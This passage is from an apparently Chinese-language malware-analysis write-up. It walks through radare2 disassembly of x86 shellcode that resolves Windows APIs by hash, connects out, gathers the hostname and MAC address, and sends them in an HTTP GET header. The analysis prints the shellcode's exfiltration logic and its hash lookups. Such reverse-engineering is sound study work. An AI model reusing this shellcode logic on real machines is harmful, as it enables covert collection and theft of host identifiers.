+            <span class="number">0x00000139</span>    81c400010000 <span class="keyword">add</span> <span class="literal">esp</span>, <span class="number">0x100</span>
+            <span class="number">0x0000013f</span>    85c0         <span class="keyword">test</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+  ========&lt; <span class="number">0x00000141</span>    0f85f2000000 <span class="keyword">jne</span> <span class="number">0x239</span>
+            <span class="number">0x00000147</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
+            <span class="number">0x00000148</span>    e8f9000000   <span class="keyword">call</span> <span class="number">0x246</span>
+               <span class="number">0x00000246</span>(unk)
+            <span class="number">0x0000014d</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
+            <span class="number">0x0000014e</span>    89ca         <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="literal">ecx</span>
+            <span class="number">0x00000150</span>    8dbde9020000 <span class="keyword">lea</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x2e9</span>]
+            <span class="number">0x00000156</span>    e8eb000000   <span class="keyword">call</span> <span class="number">0x246</span>
+               <span class="number">0x00000246</span>()
+            <span class="number">0x0000015b</span>    4f           <span class="keyword">dec</span> <span class="literal">edi</span>
+            <span class="number">0x0000015c</span>    83fa20       <span class="keyword">cmp</span> <span class="literal">edx</span>, <span class="number">0x20</span>
+  ========&lt; <span class="number">0x0000015f</span>    7c05         <span class="keyword">jl</span> <span class="number">0x166</span>
+            <span class="number">0x00000161</span>    ba20000000   <span class="keyword">mov</span> <span class="literal">edx</span>, <span class="number">0x20</span> <span class="comment">;  0x00000020 </span>
+  --------&gt; <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
+            <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
+            <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
+            <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
+            <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
+            <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
+            <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
+            <span class="number">0x0000017e</span>    5e           <span class="keyword">pop</span> <span class="literal">esi</span>
+            <span class="number">0x0000017f</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
+            <span class="number">0x00000180</span>    68a9283480   <span class="keyword">push</span> <span class="number">0x803428a9</span> <span class="comment">;  0x803428a9 </span>
+            <span class="number">0x00000185</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+</code></pre><p>首先<code>pop ebp</code>将解析器的地址弹入<code>ebp</code>，<code>ebp</code>就指向了所有解析器，显然，之后的一些长十六机制书就是windows API函数的哈希了。我们查查表、跟跟执行流程、看看四处的数据，做做注释，就知道大致怎么回事了。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2e9</span>
+GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
+Host:
+[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d1</span>
+ws2_32
+[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x00000007</span>+<span class="number">0x2d8</span>
+IPHLPAPI
+</code></pre><p>当看到一大堆往<code>0x0000010e</code>的类似跳转，猜测大概是处理出错的函数吧，可以注释之。</p>
+<p>在函数调用之前(<code>0x0000092</code>)还有个自检查</p>
+<pre><code><span class="keyword">cmp</span> <span class="preprocessor">dword</span> [<span class="literal">ebp</span>+<span class="number">0x2e9</span>], <span class="number">0x20544547</span>
+<span class="keyword">jne</span> <span class="number">0x10e</span>
+</code></pre><p>我们可以看到是看<code>ebp+0x2e9</code>指向的是不是以<code>GET</code>开头：</p>
+<pre><code><span class="special">~</span> ⮀ print "<span class="command">\x</span>20<span class="command">\x</span>54<span class="command">\x</span>45<span class="command">\x</span>47"
+TEG
+</code></pre><p>最后获得的是一个标准的shellcode建立socket流程:</p>
+<ol>
+<li>通过<code>kernel.dll!LoadlibraryA</code>载入相应dll(<code>ws2_32</code>),这里还载入了<code>IPHLPAPI</code></li>
+<li><code>ws2_32.dll!WSAStartup</code>初始化socket</li>
+<li><code>ws2_32.dll!WSASocketA</code>建立socket</li>
+<li><code>ws2_32.dll!connect</code>连接socket</li>
+</ol>
+<p>connect返回0时说明连接成功，那么可以知道<code>0x00000104</code>地方的<code>je 0x125</code>跳往的地方应该就是连接成功后要执行的位置了。可以注释下。</p>
+<p>注意之后的</p>
+<pre><code><span class="number">0x00000106</span>    fe8d89000000 <span class="keyword">dec</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x89</span>]
+<span class="number">0x0000010c</span>    75e3         <span class="keyword">jne</span> <span class="number">0xf1</span>
+</code></pre><p><code>ebp+0x89=0x90</code>，这也是我发现不知道是什么的一个字节。根据紧随其后的一个跳转来看，是一个计数器，看样子是尝试连接5次</p>
+<pre><code>[<span class="number">0x00000090</span>]&gt; px <span class="number">1</span>@<span class="number">0x7</span>+<span class="number">0x89</span>
+- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
+<span class="number">0x00000090</span>  <span class="number">05</span>
+</code></pre><p>如果5次connect都失败了，没有跳转到<code>0x125</code>, 就到了<code>0x10e</code>，就是我们猜测是错误处理的部分。</p>
+<pre><code>[<span class="number">0x00000256</span>]&gt; pd <span class="number">10</span>@<span class="number">0x10e</span>
+           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
+       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
+       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
+       |      <span class="number">0x00000257</span>()
+      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
+      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
+      || &gt;    <span class="number">0x00000270</span>()
+      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi
+           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
+           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
+           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
+           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
+</code></pre><p>把<code>0x256</code>的字节和1做比较，相等则调用<code>0x270</code>再执行<code>0x123</code>，否则调用<code>0x257</code>然后再跳到<code>0x123</code>。</p>
+<p>不知道判断了什么。</p>
+<p>我们先看看<code>0x257</code>吧</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
+           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
+</code></pre><p>载入<code>0x7+0x2e9</code>然后调用<code>0x246</code></p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
+GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
+Host: 
+
+[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x246</span>
+           <span class="number">0x00000246</span>    <span class="number">31</span>c9         xor ecx, ecx
+           <span class="number">0x00000248</span>    f7d1         not ecx
+           <span class="number">0x0000024a</span>    <span class="number">31</span>c0         xor eax, eax
+           <span class="number">0x0000024c</span>    f2ae         repne scasb
+           <span class="number">0x0000024e</span>    f7d1         not ecx
+           <span class="number">0x00000250</span>    <span class="number">49</span>           dec ecx
+           <span class="number">0x00000251</span>    c3           ret
+</code></pre><p><code>0x246</code>，中<code>repne scasb</code>常常用来计算字符串长度。仔细看其实<code>0x246</code>就是<code>strlen</code>。计算结果在<code>ecx</code>中,<code>edi</code>此时指向字符串<code>\0</code>下一个字节。</p>
+<p>所以回到<code>0x257</code>:</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x257</span>
+           <span class="number">0x00000257</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+           <span class="number">0x0000025d</span>    e8e4ffffff   call <span class="number">0x246</span>
+              <span class="number">0x00000246</span>()
+           <span class="number">0x00000262</span>    <span class="number">4f</span>           dec edi
+           <span class="number">0x00000263</span>    b94f000000   mov ecx, <span class="number">0x4f</span> ;  <span class="number">0x0000004f</span> 
+           <span class="number">0x00000268</span>    <span class="number">8</span>db575020000 lea esi, [ebp+<span class="number">0x275</span>]
+           <span class="number">0x0000026e</span>    f3a4         rep movsb
+           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
+              <span class="number">0x00000246</span>()
+           <span class="number">0x0000027b</span>    c3           ret
+</code></pre><p>首先<code>edi</code>减1指向字符串<code>\0</code>位置。</p>
+<pre><code><span class="special">[</span>0x00000000<span class="special">]</span>&gt; ps @0x7+0x275
+<span class="command">\x</span>0d
+Connection: keep-alive<span class="command">\x</span>0d
+Accept: */*<span class="command">\x</span>0d
+Accept-Encoding: gzip<span class="command">\x</span>0d
+<span class="command">\x</span>0d
+</code></pre><p>将两个字符串结合起来了。shellcode改变了自己，可以通过<code>ebp+0x2e9</code>获得新的HTTP报头.</p>
+<p>难道标志位不相等就构造报头？然后跳转到报头后下一位，我们稍微计算下发现跳转到一堆<code>00</code>上，崩掉了……</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; y <span class="number">0x4f</span> @<span class="number">0x7</span>+<span class="number">0x275</span>
+[<span class="number">0x00000000</span>]&gt; e io.cache=<span class="literal">true</span>
+[<span class="number">0x00000000</span>]&gt; yy <span class="number">0x32a</span>
+[<span class="number">0x00000000</span>]&gt; px @<span class="number">0x32a</span>
+- offset -   <span class="number">0</span> <span class="number">1</span>  <span class="number">2</span> <span class="number">3</span>  <span class="number">4</span> <span class="number">5</span>  <span class="number">6</span> <span class="number">7</span>  <span class="number">8</span> <span class="number">9</span>  A B  C D  E F  <span class="number">0123456789</span>ABCDEF
+<span class="number">0x0000032a</span>  <span class="number">0</span>d0a <span class="number">436f</span> <span class="number">6e6</span>e <span class="number">6563</span> <span class="number">7469</span> <span class="number">6f</span>6e <span class="number">3</span>a20 <span class="number">6</span>b65  ..Connection: ke
+<span class="number">0x0000033a</span>  <span class="number">6570</span> <span class="number">2</span>d61 <span class="number">6</span>c69 <span class="number">7665</span> <span class="number">0</span>d0a <span class="number">4163</span> <span class="number">6365</span> <span class="number">7074</span>  ep-alive..Accept
+<span class="number">0x0000034a</span>  <span class="number">3</span>a20 <span class="number">2</span>a2f <span class="number">2</span>a0d <span class="number">0</span>a41 <span class="number">6363</span> <span class="number">6570</span> <span class="number">742</span>d <span class="number">456</span>e  : *<span class="comment">/*..Accept-En
+0x0000035a  636f 6469 6e67 3a20 677a 6970 0d0a 0d0a  coding: gzip....
+0x0000036a  0083 c70e 31c9 f7d1 31c0 f3ae 4fff e700  ....1...1...O...
+0x0000037a  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x0000038a  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x0000039a  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x000003aa  0000 0000 0000 0000 0000 0000 0000 0000  ................
+0x000003ba  0090 ffff ffff ffff ffff ffff ffff ffff  ................</span>
+</code></pre><p>回到<code>0x10e</code>，我们再看看<code>0x270</code>, 标志位为1发生什么。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt;  pd <span class="number">3</span>@<span class="number">0x270</span>
+           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
+              <span class="number">0x00000246</span>()
+           <span class="number">0x0000027b</span>    c3           ret
+
+
+[<span class="number">0x00000000</span>]&gt;  pd <span class="number">6</span>@<span class="number">0x10e</span>
+           <span class="number">0x0000010e</span>    <span class="number">80</span>bd4f02000. cmp byte [ebp+<span class="number">0x24f</span>], <span class="number">0x1</span>
+       ,=&lt; <span class="number">0x00000115</span>    <span class="number">7407</span>         je <span class="number">0x11e</span>
+       |   <span class="number">0x00000117</span>    e83b010000   call <span class="number">0x257</span>
+       |      <span class="number">0x00000257</span>(unk)
+      ,==&lt; <span class="number">0x0000011c</span>    eb05         jmp <span class="number">0x123</span>
+      |`-&gt; <span class="number">0x0000011e</span>    e84d010000   call <span class="number">0x270</span>
+      || &gt;    <span class="number">0x00000270</span>()
+      `--&gt; <span class="number">0x00000123</span>    ffe7         jmp edi
+
+
+[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x270</span>
+           <span class="number">0x00000270</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+           <span class="number">0x00000276</span>    e8cbffffff   call <span class="number">0x246</span>
+              <span class="number">0x00000246</span>()
+           <span class="number">0x0000027b</span>    c3           ret
+</code></pre><p>What?计算下报头长度，然后直接跳过去崩掉……</p>
+<p>反正只要<code>connect</code>失败就崩了……只不过崩之前干的事情不同，不知道<code>ebp+0x24f</code>是判断啥的标志位。</p>
+<p>Ok, 如果<code>connect</code>成功连接。</p>
+<pre><code><span class="number">0x00000104</span>    <span class="number">741f</span>         je <span class="number">0x125</span>
+</code></pre><p>我们可以看到，从<code>0x125</code>就是<code>gethostname</code>了。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span> @<span class="number">0x125</span>
+           <span class="number">0x00000125</span>    b800010000   mov eax, <span class="number">0x100</span> ;  <span class="number">0x00000100</span> 
+           <span class="number">0x0000012a</span>    <span class="number">29</span>c4         sub esp, eax
+           <span class="number">0x0000012c</span>    <span class="number">89e2</span>         mov edx, esp
+           <span class="number">0x0000012e</span>    <span class="number">52</span>           push edx
+           <span class="number">0x0000012f</span>    <span class="number">50</span>           push eax
+           <span class="number">0x00000130</span>    <span class="number">52</span>           push edx
+           <span class="number">0x00000131</span>    <span class="number">68</span>b649de01   push <span class="number">0x1de49b6</span> ;  <span class="number">0x01de49b6</span> 
+           <span class="number">0x00000136</span>    ffd5         call ebp
+
+exercise ● ⮀ python hash.py ws2_32.dll gethostname
+[+] Ran on Sat Aug <span class="number">16</span> <span class="number">20</span>:<span class="number">23</span>:<span class="number">44</span> <span class="number">2014</span>
+
+[+] <span class="number">0x01DE49B6</span> = ws2_32.dll!gethostname
+</code></pre><p><code>gethostname</code>的结果写入<code>edi</code>中，接着判断如果失败跳到<code>0x239</code>去，不知道是啥。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x239</span>
+       |   <span class="number">0x00000239</span>    <span class="number">53</span>           push ebx
+       |   <span class="number">0x0000023a</span>    <span class="number">68756e4</span>d61   push <span class="number">0x614d6e75</span> ;  <span class="number">0x614d6e75</span> 
+       |   <span class="number">0x0000023f</span>    ffd5         call ebp
+       |      <span class="number">0x00000000</span>(unk, unk, unk) ; name
+</code></pre><p>这个hash是<code>&quot;ws2_32.dll!closesocket&quot;</code>那么就很显然是关闭socket的函数了.</p>
+<p>我们回到之前<code>gethostname</code>地方：</p>
+<pre><code>  ,=&lt; <span class="number">0x00000141</span>    <span class="number">0f</span>85f2000000 jne <span class="number">0x239</span>
+ |   <span class="number">0x00000147</span>    <span class="number">57</span>           push edi
+ |   <span class="number">0x00000148</span>    e8f9000000   call <span class="number">0x246</span>
+ |      <span class="number">0x00000246</span>(unk) ; <span class="built_in">strlen</span>
+ |   <span class="number">0x0000014d</span>    <span class="number">5</span>e           pop esi
+ |   <span class="number">0x0000014e</span>    <span class="number">89</span>ca         mov edx, ecx
+ |   <span class="number">0x00000150</span>    <span class="number">8</span>dbde9020000 lea edi, [ebp+<span class="number">0x2e9</span>]
+ |   <span class="number">0x00000156</span>    e8eb000000   call <span class="number">0x246</span>
+ |      <span class="number">0x00000246</span>() ; <span class="built_in">strlen</span>
+ |   <span class="number">0x0000015b</span>    <span class="number">4f</span>           dec edi
+ |   <span class="number">0x0000015c</span>    <span class="number">83f</span>a20       cmp edx, <span class="number">0x20</span>
+,==&lt; <span class="number">0x0000015f</span>    <span class="number">7</span>c05         jl <span class="number">0x166</span>
+</code></pre><p>接下来，又是计算字符串长度，判断之前<code>gethostname</code>结果是否等于32,如果比32小则跳转到<code>0x166</code>, 如果大于32则将edx设置成32。而<code>0x166</code>开始又是之前我们分析过的拼接字符串的部分。</p>
+<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">7</span>@<span class="number">0x166</span>
+           <span class="number">0x00000166</span>    89d1         <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="literal">edx</span>
+           <span class="number">0x00000168</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
+           <span class="number">0x00000169</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
+           <span class="number">0x0000016b</span>    b90d000000   <span class="keyword">mov</span> <span class="literal">ecx</span>, <span class="number">0xd</span> <span class="comment">;  0x0000000d </span>
+           <span class="number">0x00000170</span>    8db5c4020000 <span class="keyword">lea</span> <span class="literal">esi</span>, [<span class="literal">ebp</span>+<span class="number">0x2c4</span>]
+           <span class="number">0x00000176</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
+           <span class="number">0x00000178</span>    89bd4b020000 <span class="keyword">mov</span> [<span class="literal">ebp</span>+<span class="number">0x24b</span>], <span class="literal">edi</span>
+</code></pre><p>就是把<code>gethostname</code>的结果拼接到<code>HOST</code>字段上。</p>
+<pre><code>[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2c4</span>
+\x0d
+Cookie: ID=ws2_32
+[<span class="number">0x00000246</span>]&gt; ps @<span class="number">0x7</span>+<span class="number">0x2e9</span>
+GET /<span class="number">05</span>cea4de-<span class="number">951</span>d-<span class="number">4037</span>-bf8f-f69055b279bb HTTP/<span class="number">1.1</span>\x0d
+Host: 
+</code></pre><p>同时<code>gethostname</code>获取的结果保存到堆栈上，最后弹出，调用<code>gethostbyname</code>。</p>
+<pre><code>[<span class="number">0x00000246</span>]&gt; pd <span class="number">10</span>@<span class="number">0x179</span>
+           <span class="number">0x00000179</span>    bd4b020000   mov ebp, <span class="number">0x24b</span> ;  <span class="number">0x0000024b</span> 
+           <span class="number">0x0000017e</span>    <span class="number">5</span>e           pop esi
+           <span class="number">0x0000017f</span>    <span class="number">56</span>           push esi
+           <span class="number">0x00000180</span>    <span class="number">68</span>a9283480   push <span class="number">0x803428a9</span> ;  <span class="number">0x803428a9</span> 
+           <span class="number">0x00000185</span>    ffd5         call ebp
+              <span class="number">0x00000000</span>(unk, unk) ; name
+           <span class="number">0x00000187</span>    <span class="number">85</span>c0         test eax, eax
+
+% python hash.py ws2_32.dll gethostbyname
+[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">21</span> <span class="number">2014</span>
+
+[+] <span class="number">0x803428A9</span> = ws2_32.dll!gethostbyname
+</code></pre><p>两次检查结果确认返回了正确的结果，</p>
+<p>紧接着，准备数据，调用<code>sendARP</code>获取mac地址</p>
+<pre><code>% python hash.py iphlpapi.dll SendARP             
+[+] Ran on Tue Aug <span class="number">19</span> <span class="number">16</span>:<span class="number">21</span>:<span class="number">37</span> <span class="number">2014</span>
+
+[+] <span class="number">0xB8D27248</span> = iphlpapi.dll!SendARP
+
+
+  ||   <span class="number">0x0000019d</span>    8d400c       <span class="keyword">lea</span> <span class="literal">eax</span>, [<span class="literal">eax</span>+<span class="number">0xc</span>]
+  ||   <span class="number">0x000001a0</span>    8b00         <span class="keyword">mov</span> <span class="literal">eax</span>, [<span class="literal">eax</span>]
+  ||   <span class="number">0x000001a2</span>    8b08         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">eax</span>]
+  ||   <span class="number">0x000001a4</span>    8b09         <span class="keyword">mov</span> <span class="literal">ecx</span>, [<span class="literal">ecx</span>]
+  ||   <span class="number">0x000001a6</span>    b800010000   <span class="keyword">mov</span> <span class="literal">eax</span>, <span class="number">0x100</span> <span class="comment">;  0x00000100 </span>
+  ||   <span class="number">0x000001ab</span>    <span class="number">50</span>           <span class="keyword">push</span> <span class="literal">eax</span>
+  ||   <span class="number">0x000001ac</span>    89e7         <span class="keyword">mov</span> <span class="literal">edi</span>, <span class="literal">esp</span>
+  ||   <span class="number">0x000001ae</span>    29c4         <span class="keyword">sub</span> <span class="literal">esp</span>, <span class="literal">eax</span>
+  ||   <span class="number">0x000001b0</span>    89e6         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">esp</span>
+  ||   <span class="number">0x000001b2</span>    <span class="number">57</span>           <span class="keyword">push</span> <span class="literal">edi</span>
+  ||   <span class="number">0x000001b3</span>    <span class="number">56</span>           <span class="keyword">push</span> <span class="literal">esi</span>
+  ||   <span class="number">0x000001b4</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
+  ||   <span class="number">0x000001b5</span>    <span class="number">51</span>           <span class="keyword">push</span> <span class="literal">ecx</span>
+  ||   <span class="number">0x000001b6</span>    684872d2b8   <span class="keyword">push</span> <span class="number">0xb8d27248</span> <span class="comment">;  sendARP </span>
+  ||   <span class="number">0x000001bb</span>    ffd5         <span class="keyword">call</span> <span class="literal">ebp</span>
+</code></pre><p>根据msdn上看到的，<code>edi</code>指向mac地址的长度。接下来比较mac地址是否是六个字节，如果不是……我们之前看到了0x239是<code>closesocket</code></p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x1bf</span>
+           <span class="number">0x000001bf</span>    <span class="number">81</span>c404010000 add esp, <span class="number">0x104</span>
+           <span class="number">0x000001c5</span>    <span class="number">0f</span>b70f       movzx ecx, word [edi]
+           <span class="number">0x000001c8</span>    <span class="number">83f</span>906       cmp ecx, <span class="number">0x6</span>
+       ,=&lt; <span class="number">0x000001cb</span>    <span class="number">726</span>c         jb <span class="number">0x239</span>
+</code></pre><p>接下来这个乍一看让人困惑，在栈上分配空间，还干了一堆不知道干什么的。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">32</span>@<span class="number">0x1cd</span>
+|          <span class="number">0x000001cd</span>    b906000000   mov ecx, <span class="number">0x6</span> ;  <span class="number">0x00000006</span> 
+|          <span class="number">0x000001d2</span>    b810000000   mov eax, <span class="number">0x10</span> ;  <span class="number">0x00000010</span> 
+|          <span class="number">0x000001d7</span>    <span class="number">29</span>c4         sub esp, eax
+|          <span class="number">0x000001d9</span>    <span class="number">89e7</span>         mov edi, esp
+|          <span class="number">0x000001db</span>    <span class="number">89</span>ca         mov edx, ecx
+|          <span class="number">0x000001dd</span>    d1e2         shl edx, <span class="number">1</span>
+|          <span class="number">0x000001df</span>    <span class="number">50</span>           push eax
+|          <span class="number">0x000001e0</span>    <span class="number">52</span>           push edx
+|          ; JMP XREF from <span class="number">0x0000020b</span> (fcn<span class="number">.00000090</span>)
+|  .-----&gt; <span class="number">0x000001e1</span>    <span class="number">31</span>d2         xor edx, edx
+|  |       <span class="number">0x000001e3</span>    <span class="number">8</span>a16         mov dl, [esi]
+|  |       <span class="number">0x000001e5</span>    <span class="number">88</span>d0         mov al, dl
+|  |       <span class="number">0x000001e7</span>    <span class="number">24f</span>0         and al, <span class="number">0xf0</span>
+|  |       <span class="number">0x000001e9</span>    c0e804       shr al, <span class="number">0x4</span>
+|  |       <span class="number">0x000001ec</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
+|  |   ,=&lt; <span class="number">0x000001ee</span>    <span class="number">7704</span>         ja <span class="number">0x1f4</span>
+|  |   |   <span class="number">0x000001f0</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
+|  |  ,==&lt; <span class="number">0x000001f2</span>    eb02         jmp <span class="number">0x1f6</span> ; (fcn<span class="number">.00000090</span>)
+|  |  ||   ; JMP XREF from <span class="number">0x000001ee</span> (fcn<span class="number">.00000090</span>)
+|  |  |`-&gt; <span class="number">0x000001f4</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
+|  |  |    ; JMP XREF from <span class="number">0x000001f2</span> (fcn<span class="number">.00000090</span>)
+|  |  `--&gt; <span class="number">0x000001f6</span>    <span class="number">8807</span>         mov [edi], al
+|  |       <span class="number">0x000001f8</span>    <span class="number">47</span>           inc edi
+|  |       <span class="number">0x000001f9</span>    <span class="number">88</span>d0         mov al, dl
+|  |       <span class="number">0x000001fb</span>    <span class="number">240f</span>         and al, <span class="number">0xf</span>
+|  |       <span class="number">0x000001fd</span>    <span class="number">3</span>c09         cmp al, <span class="number">0x9</span>
+|  | ,===&lt; <span class="number">0x000001ff</span>    <span class="number">7704</span>         ja <span class="number">0x205</span>
+|  | |     <span class="number">0x00000201</span>    <span class="number">0430</span>         add al, <span class="number">0x30</span>
+|  |,====&lt; <span class="number">0x00000203</span>    eb02         jmp <span class="number">0x207</span> ; (fcn<span class="number">.00000090</span>)
+|  |||     ; JMP XREF from <span class="number">0x000001ff</span> (fcn<span class="number">.00000090</span>)
+|  ||`---&gt; <span class="number">0x00000205</span>    <span class="number">0437</span>         add al, <span class="number">0x37</span>
+|  ||      ; JMP XREF from <span class="number">0x00000203</span> (fcn<span class="number">.00000090</span>)
+|  |`----&gt; <span class="number">0x00000207</span>    <span class="number">8807</span>         mov [edi], al
+|  |       <span class="number">0x00000209</span>    <span class="number">47</span>           inc edi
+|  |       <span class="number">0x0000020a</span>    <span class="number">46</span>           inc esi
+|  `=====&lt; <span class="number">0x0000020b</span>    e2d4         loop <span class="number">0x1e1</span>
+|          <span class="number">0x0000020d</span>    <span class="number">59</span>           pop ecx
+</code></pre><p>后来看看原来如此</p>
+<pre><code>In [<span class="number">9</span>]: chr(<span class="number">10</span>+<span class="number">0x37</span>)
+Out[<span class="number">9</span>]: <span class="string">'A'</span>
+
+In [<span class="number">10</span>]: chr(<span class="number">9</span>+<span class="number">0x30</span>)
+Out[<span class="number">10</span>]: <span class="string">'9'</span>
+</code></pre><p>原来是把mac地址转换成可打印字符。</p>
+<p>下一步，估计就是放进http报头中发送了。</p>
+<pre><code>[<span class="number">0x00000000</span>]&gt; pd <span class="number">10</span>@<span class="number">0x0000020d</span>
+|          <span class="number">0x0000020d</span>    <span class="number">59</span>           <span class="keyword">pop</span> <span class="literal">ecx</span>
+|          <span class="number">0x0000020e</span>    29cf         <span class="keyword">sub</span> <span class="literal">edi</span>, <span class="literal">ecx</span>
+|          <span class="number">0x00000210</span>    89fe         <span class="keyword">mov</span> <span class="literal">esi</span>, <span class="literal">edi</span>
+|          <span class="number">0x00000212</span>    <span class="number">58</span>           <span class="keyword">pop</span> <span class="literal">eax</span>
+|          <span class="number">0x00000213</span>    01c4         <span class="keyword">add</span> <span class="literal">esp</span>, <span class="literal">eax</span>
+|          <span class="number">0x00000215</span>    8bbd4b020000 <span class="keyword">mov</span> <span class="literal">edi</span>, [<span class="literal">ebp</span>+<span class="number">0x24b</span>]
+|          <span class="number">0x0000021b</span>    f3a4         <span class="keyword">rep</span> <span class="keyword">movsb</span>
+|          <span class="number">0x0000021d</span>    c6854f02000. <span class="keyword">mov</span> <span class="preprocessor">byte</span> [<span class="literal">ebp</span>+<span class="number">0x24f</span>], <span class="number">0x1</span> <span class="comment">;  0x00000001 </span>
+|          <span class="number">0x00000224</span>    e82e000000   <span class="keyword">call</span> <span class="number">0x257</span> <span class="comment">; (fcn.00000252)</span>
+|             fcn<span class="string">.00000252</span>()
+|          <span class="number">0x00000229</span>    31c0         <span class="keyword">xor</span> <span class="literal">eax</span>, <span class="literal">eax</span>
+</code></pre><p>果然是，调用<code>0x257</code>拼接报头。</p>
+<p>之后，</p>
+<pre><code>[<span class="number">0x00000252</span>]&gt; pd <span class="number">10</span>@<span class="number">0x00000229</span>
+|          <span class="number">0x00000229</span>    <span class="number">31</span>c0         xor eax, eax
+|          <span class="number">0x0000022b</span>    <span class="number">50</span>           push eax
+|          <span class="number">0x0000022c</span>    <span class="number">51</span>           push ecx
+|          <span class="number">0x0000022d</span>    <span class="number">29</span>cf         sub edi, ecx
+|          <span class="number">0x0000022f</span>    <span class="number">4f</span>           dec edi
+|          <span class="number">0x00000230</span>    <span class="number">57</span>           push edi
+|          <span class="number">0x00000231</span>    <span class="number">53</span>           push ebx
+|          <span class="number">0x00000232</span>    <span class="number">68</span>c2eb385f   push <span class="number">0x5f38ebc2</span> ;  ws2_32!send 
+|          <span class="number">0x00000237</span>    ffd5         call ebp
+|             fcn<span class="number">.00000000</span>(unk, unk, unk, unk, unk)
